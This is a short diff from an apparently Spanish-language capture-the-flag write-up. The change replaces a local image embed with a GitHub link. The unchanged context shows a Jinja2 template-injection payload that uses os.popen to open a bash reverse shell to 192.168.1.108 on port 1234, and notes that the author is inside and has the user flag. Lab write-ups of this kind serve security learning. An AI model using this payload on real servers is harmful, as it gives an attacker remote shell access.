@@ -41,7 +41,7 @@ lanzamos:
      {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c \'bash -i >& /dev/tcp/192.168.1.108/1234 0>&1\'').read() }}
 
 
-![[reverse.png]]
+![image](https://github.com/user-attachments/assets/4cc43c1b-4349-4145-9bea-4e694d069db5)
 
 y estamos dentro y también de primero nos da la flag de usuario
 
